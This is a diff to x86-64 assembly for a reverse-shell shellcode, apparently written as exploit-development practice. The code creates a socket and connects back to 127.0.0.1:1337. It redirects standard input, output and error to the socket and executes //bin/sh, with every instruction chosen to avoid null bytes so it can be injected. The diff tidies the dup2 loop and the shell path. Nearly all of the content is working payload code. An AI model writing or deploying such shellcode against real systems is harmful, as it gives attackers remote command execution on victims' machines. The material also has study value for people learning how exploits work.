@@ -2,11 +2,11 @@ section .text
 global _start
 
 _start:
-_socket:
     xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
     xor rbx, rbx ; clear rbx, this results in no 0 bytes in the shellcode
     xor rcx, rcx ; clear rcx, this results in no 0 bytes in the shellcode
     xor rdx, rdx ; clear rdx, this results in no 0 bytes in the shellcode
+_socket:
     ; we use the bl,cl,dl registers instead of rbx rcx rdx registers because
     ; they result in extra 0 bytes in the shell code
     mov bl, 2 ; AF_INET
@@ -19,28 +19,26 @@ _socket:
 _connect:
     mov rbx, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
     push rbx ; use rbx here, because we overwrite it afterwards, so we save a xor to clear it
-
     mov al, 42 ; connect
     ; rdi is normally set, but we've already set it it in _socket
     mov rsi, rsp
     mov dl, 0x10
     syscall
 
+    xor rcx, rcx
+    push rcx ; push zeroes on stack so that we have 0 bytes after /bin/sh
 _dup2:
-    xor rcx, rcx ; stdout, set 0 to rcx without using mov rcx, 0 -> which results in 0 bytes in the shellcode
     mov rbx, rdi
     mov al, 63 ; dup2
     int 0x80
 
-    cmp cl, 3 ; did we reach stderr yet?
-    jz short 0x5 ; if so jump past next instructions, found jmp numbers by inspecting where it wants to jump in objdump -d
     inc cl ; increment cl so that it becomes, 1 (stdin) -> 2 (stderr)
-    jmp short -12 ; jump back to dup2, found jmp numbers by inspecting where it wants to jump in objdump -d
+    cmp cl, 3; did we reach stderr yet?
+    jnz _dup2
 
+_execve:
     ; prepare execing bin/bash
-    ; mov al, `h` ; we use al here, becaue we don't want to padd with 0 bytes
-    push `h` ; we push ax here because we want to add a zero byte after /bin/bash on the stack
-    mov rbx, `/bin/bas` ; use rbx here, because we don't depend on it afterwards, so we save a xor to clear it
+    mov rbx, `//bin/sh` ; use rbx here, because we don't depend on it afterwards, so we save a xor to clear it
     push rbx
 
     mov al, 59 ; execve, use al, this results in no 0 bytes in the shellcode
